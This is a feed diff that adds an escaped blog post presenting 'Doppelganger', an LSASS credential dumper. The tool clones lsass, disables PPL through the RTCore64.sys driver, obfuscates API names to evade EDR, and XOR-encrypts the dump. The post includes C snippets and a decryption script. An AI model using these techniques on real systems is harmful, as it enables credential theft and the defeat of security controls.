@@ -24,7 +24,237 @@
       <pubDate>Wed, 02 Apr 2025 15:28:21 +0200</pubDate>
       
       <guid>/posts/doppelganger/</guid>
-      <description></description>
+      <description>&lt;h3 id=&#34;doppelganger-program-an-advanced-lsass-dumper-with-process-cloning&#34; &gt;
+&lt;div&gt;
+    &lt;a href=&#34;#doppelganger-program-an-advanced-lsass-dumper-with-process-cloning&#34;&gt;
+        ##
+    &lt;/a&gt;
+    Doppelganger Program: An Advanced LSASS Dumper with Process Cloning
+&lt;/div&gt;
+&lt;/h3&gt;
+&lt;h4 id=&#34;author-varish&#34; &gt;
+&lt;div&gt;
+    &lt;a href=&#34;#author-varish&#34;&gt;
+        ###
+    &lt;/a&gt;
+    Author: vari.sh
+&lt;/div&gt;
+&lt;/h4&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/doppelganger.png&#34; alt=&#34;Doppelganger&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;overview&#34; &gt;
+&lt;div&gt;
+    &lt;a href=&#34;#overview&#34;&gt;
+        #
+    &lt;/a&gt;
+    Overview
+&lt;/div&gt;
+&lt;/h2&gt;
+&lt;p&gt;The &lt;strong&gt;Doppelganger Program&lt;/strong&gt; is an advanced Windows utility designed to obtain an LSASS (Local Security Authority Subsystem Service) dump from a cloned process, rather than the original one. By using process cloning techniques, the tool aims to bypass PPL (Process Protected Light), VBS (Virtualization Based Security), EDR/XDR detection mechanisms that typically monitor interactions with &lt;code&gt;lsass.exe&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The program achieves this by:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Obtaining a SYSTEM token through token duplication.&lt;/li&gt;
+&lt;li&gt;Loading clean versions of Windows DLLs to avoid detection.&lt;/li&gt;
+&lt;li&gt;Cloning the LSASS process using &lt;code&gt;NtCreateProcessEx&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Disabling PPL (Protected Process Light) protection on &lt;code&gt;lsass.exe&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Creating an LSASS dump using &lt;code&gt;MiniDumpWriteDump()&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Encrypting the dump file using XOR encryption to further avoid detection.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;features&#34; &gt;
+&lt;div&gt;
+    &lt;a href=&#34;#features&#34;&gt;
+        #
+    &lt;/a&gt;
+    Features
+&lt;/div&gt;
+&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Process Cloning:&lt;/strong&gt; Uses &lt;code&gt;NtCreateProcessEx&lt;/code&gt; to clone &lt;code&gt;lsass.exe&lt;/code&gt; and avoid detection.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;XOR Encryption:&lt;/strong&gt; Dumps are encrypted with a predefined XOR key before being written to disk.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Driver Interaction:&lt;/strong&gt; Leverages &lt;code&gt;RTCore64.sys&lt;/code&gt; for direct memory access to disable PPL.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Token Manipulation:&lt;/strong&gt; Elevates to SYSTEM privileges to access LSASS.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;DLL Offuscation:&lt;/strong&gt; Loads DLLs using encrypted strings to bypass signature-based detections.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;installation&#34; &gt;
+&lt;div&gt;
+    &lt;a href=&#34;#installation&#34;&gt;
+        #
+    &lt;/a&gt;
+    Installation
+&lt;/div&gt;
+&lt;/h2&gt;
+&lt;p&gt;The Doppelganger Program is written in C and is intended to be compiled using Visual Studio. The repository is structured as follows:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;doppelganger/
+│
+├── includes/          # Header files (.h)
+├── src/               # Source files (.c)
+├── build/             # Output binaries
+├── utils/             # Utility scripts (e.g., decryptor)
+└── README.md          # Documentation
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;compilation&#34; &gt;
+&lt;div&gt;
+    &lt;a href=&#34;#compilation&#34;&gt;
+        ##
+    &lt;/a&gt;
+    Compilation
+&lt;/div&gt;
+&lt;/h3&gt;
+&lt;p&gt;Compile the project in Visual Studio using the provided solution file.
+Ensure to have the &lt;code&gt;RTCore64.sys&lt;/code&gt; driver present and accessible by the program.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;code-breakdown&#34; &gt;
+&lt;div&gt;
+    &lt;a href=&#34;#code-breakdown&#34;&gt;
+        #
+    &lt;/a&gt;
+    Code Breakdown
+&lt;/div&gt;
+&lt;/h2&gt;
+&lt;h3 id=&#34;1-resolving-apis&#34; &gt;
+&lt;div&gt;
+    &lt;a href=&#34;#1-resolving-apis&#34;&gt;
+        ##
+    &lt;/a&gt;
+    1. Resolving APIs
+&lt;/div&gt;
+&lt;/h3&gt;
+&lt;p&gt;The tool resolves critical Windows APIs by decrypting their names from encrypted strings and dynamically loading them with &lt;code&gt;CustomGetProcAddress()&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#78787e&#34;&gt;// Example of resolving API pointers
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#78787e&#34;&gt;&lt;/span&gt;BOOL success &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#57c7ff&#34;&gt;ResolveApiFromDll&lt;/span&gt;(hKernel32, P32F_ENC, &lt;span style=&#34;color:#ff6ac1&#34;&gt;sizeof&lt;/span&gt;(P32F_ENC), (&lt;span style=&#34;color:#9aedfe&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;**&lt;/span&gt;)&lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;amp;&lt;/span&gt;pP32F) &lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#57c7ff&#34;&gt;ResolveApiFromDll&lt;/span&gt;(hNtdll, NTCPE_ENC, &lt;span style=&#34;color:#ff6ac1&#34;&gt;sizeof&lt;/span&gt;(NTCPE_ENC), (&lt;span style=&#34;color:#9aedfe&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;**&lt;/span&gt;)&lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;amp;&lt;/span&gt;pNTCPX) &lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#57c7ff&#34;&gt;ResolveApiFromDll&lt;/span&gt;(hAdvapi32, OPTK_ENC, &lt;span style=&#34;color:#ff6ac1&#34;&gt;sizeof&lt;/span&gt;(OPTK_ENC), (&lt;span style=&#34;color:#9aedfe&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;**&lt;/span&gt;)&lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;amp;&lt;/span&gt;pOPTK);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#ff6ac1&#34;&gt;!&lt;/span&gt;success) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#57c7ff&#34;&gt;log_error&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;Failed to resolve one or more APIs.&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;return&lt;/span&gt; FALSE;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;2-token-duplication&#34; &gt;
+&lt;div&gt;
+    &lt;a href=&#34;#2-token-duplication&#34;&gt;
+        ##
+    &lt;/a&gt;
+    2. Token Duplication
+&lt;/div&gt;
+&lt;/h3&gt;
+&lt;p&gt;To interact with &lt;code&gt;lsass.exe&lt;/code&gt;, the tool impersonates SYSTEM using duplicated tokens.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;HANDLE hSystemToken &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;NULL&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#ff6ac1&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#57c7ff&#34;&gt;GetSystemTokenAndDuplicate&lt;/span&gt;(&lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;amp;&lt;/span&gt;hSystemToken)) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#57c7ff&#34;&gt;log_error&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;Failed to duplicate SYSTEM token.&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ff9f43&#34;&gt;1&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;3-process-cloning&#34; &gt;
+&lt;div&gt;
+    &lt;a href=&#34;#3-process-cloning&#34;&gt;
+        ##
+    &lt;/a&gt;
+    3. Process Cloning
+&lt;/div&gt;
+&lt;/h3&gt;
+&lt;p&gt;Using &lt;code&gt;NtCreateProcessEx&lt;/code&gt;, the tool creates a clone of &lt;code&gt;lsass.exe&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NTSTATUS status &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#57c7ff&#34;&gt;pNTCPX&lt;/span&gt;(
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;amp;&lt;/span&gt;hClone,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    PROCESS_ALL_ACCESS,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;amp;&lt;/span&gt;objAttr,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    hLsass,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff9f43&#34;&gt;0&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff5c57&#34;&gt;NULL&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff5c57&#34;&gt;NULL&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff5c57&#34;&gt;NULL&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    FALSE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;4-disabling-ppl&#34; &gt;
+&lt;div&gt;
+    &lt;a href=&#34;#4-disabling-ppl&#34;&gt;
+        ##
+    &lt;/a&gt;
+    4. Disabling PPL
+&lt;/div&gt;
+&lt;/h3&gt;
+&lt;p&gt;Protected Process Light (PPL) protection is disabled by directly modifying memory using the &lt;code&gt;RTCore64.sys&lt;/code&gt; driver.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#57c7ff&#34;&gt;WriteMemoryPrimitive&lt;/span&gt;(Device, &lt;span style=&#34;color:#ff9f43&#34;&gt;1&lt;/span&gt;, eproc &lt;span style=&#34;color:#ff6ac1&#34;&gt;+&lt;/span&gt; offs.Protection &lt;span style=&#34;color:#ff6ac1&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ff9f43&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ff9f43&#34;&gt;0x00&lt;/span&gt;); &lt;span style=&#34;color:#78787e&#34;&gt;// SignatureLevel
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#78787e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#57c7ff&#34;&gt;WriteMemoryPrimitive&lt;/span&gt;(Device, &lt;span style=&#34;color:#ff9f43&#34;&gt;1&lt;/span&gt;, eproc &lt;span style=&#34;color:#ff6ac1&#34;&gt;+&lt;/span&gt; offs.Protection &lt;span style=&#34;color:#ff6ac1&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ff9f43&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ff9f43&#34;&gt;0x00&lt;/span&gt;); &lt;span style=&#34;color:#78787e&#34;&gt;// SectionSignatureLevel
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#78787e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#57c7ff&#34;&gt;WriteMemoryPrimitive&lt;/span&gt;(Device, &lt;span style=&#34;color:#ff9f43&#34;&gt;1&lt;/span&gt;, eproc &lt;span style=&#34;color:#ff6ac1&#34;&gt;+&lt;/span&gt; offs.Protection, &lt;span style=&#34;color:#ff9f43&#34;&gt;0x00&lt;/span&gt;); &lt;span style=&#34;color:#78787e&#34;&gt;// Protection
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#78787e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#57c7ff&#34;&gt;log_success&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;PPL disabled (0x00 written)&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After the cloning, the values will be restored.&lt;/p&gt;
+&lt;h3 id=&#34;5-creating-the-dump&#34; &gt;
+&lt;div&gt;
+    &lt;a href=&#34;#5-creating-the-dump&#34;&gt;
+        ##
+    &lt;/a&gt;
+    5. Creating the Dump
+&lt;/div&gt;
+&lt;/h3&gt;
+&lt;p&gt;Finally, a memory dump of the cloned &lt;code&gt;lsass.exe&lt;/code&gt; process is created and encrypted.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BOOL dumped &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#57c7ff&#34;&gt;pMDWD&lt;/span&gt;(
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    hClone,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    clonedPID,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    hTempFile,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    MiniDumpWithFullMemory,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff5c57&#34;&gt;NULL&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff5c57&#34;&gt;NULL&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff5c57&#34;&gt;NULL&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id=&#34;decryption&#34; &gt;
+&lt;div&gt;
+    &lt;a href=&#34;#decryption&#34;&gt;
+        #
+    &lt;/a&gt;
+    Decryption
+&lt;/div&gt;
+&lt;/h2&gt;
+&lt;p&gt;A simple Python script is provided to decrypt the dumped files.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;import&lt;/span&gt; sys
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;XOR_KEY &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#5af78e&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;0123456789abcdefghij&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#57c7ff&#34;&gt;xor_decrypt&lt;/span&gt;(data: &lt;span style=&#34;color:#ff5c57&#34;&gt;bytes&lt;/span&gt;, key: &lt;span style=&#34;color:#ff5c57&#34;&gt;bytes&lt;/span&gt;) &lt;span style=&#34;color:#ff6ac1&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;bytes&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;bytes&lt;/span&gt;([b &lt;span style=&#34;color:#ff6ac1&#34;&gt;^&lt;/span&gt; key[i &lt;span style=&#34;color:#ff6ac1&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;len&lt;/span&gt;(key)] &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; i, b &lt;span style=&#34;color:#ff6ac1&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;enumerate&lt;/span&gt;(data)])
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#57c7ff&#34;&gt;main&lt;/span&gt;():
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;len&lt;/span&gt;(sys&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;argv) &lt;span style=&#34;color:#ff6ac1&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ff9f43&#34;&gt;2&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;Usage: &lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;{&lt;/span&gt;sys&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ff9f43&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#5af78e&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt; &amp;lt;xor_dump_path&amp;gt;&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        sys&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;exit(&lt;span style=&#34;color:#ff9f43&#34;&gt;1&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    encrypted_path &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; sys&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ff9f43&#34;&gt;1&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    output_path &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; encrypted_path &lt;span style=&#34;color:#ff6ac1&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;.dec&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;with&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;open&lt;/span&gt;(encrypted_path, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;rb&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#ff6ac1&#34;&gt;as&lt;/span&gt; f:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        data &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;read()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    decrypted &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; xor_decrypt(data, XOR_KEY)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;with&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;open&lt;/span&gt;(output_path, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;wb&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#ff6ac1&#34;&gt;as&lt;/span&gt; f:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        f&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;write(decrypted)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;Decryption successful. Output written to: &lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;{&lt;/span&gt;output_path&lt;span style=&#34;color:#5af78e&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#ff6ac1&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    main()
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id=&#34;conclusion&#34; &gt;
+&lt;div&gt;
+    &lt;a href=&#34;#conclusion&#34;&gt;
+        #
+    &lt;/a&gt;
+    Conclusion
+&lt;/div&gt;
+&lt;/h2&gt;
+&lt;p&gt;The Doppelganger Program demonstrates how process cloning, API obfuscation, and memory manipulation can be used to bypass traditional detection mechanisms. The combination of techniques makes it effective at retrieving sensitive memory data even on systems protected by anti-tampering mechanisms.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;disclaimer&#34; &gt;
+&lt;div&gt;
+    &lt;a href=&#34;#disclaimer&#34;&gt;
+        #
+    &lt;/a&gt;
+    Disclaimer
+&lt;/div&gt;
+&lt;/h2&gt;
+&lt;p&gt;This project is for educational purposes only. Use responsibly and only in environments where you have explicit permission to test security mechanisms.&lt;/p&gt;
+</description>
     </item>
     
   </channel>
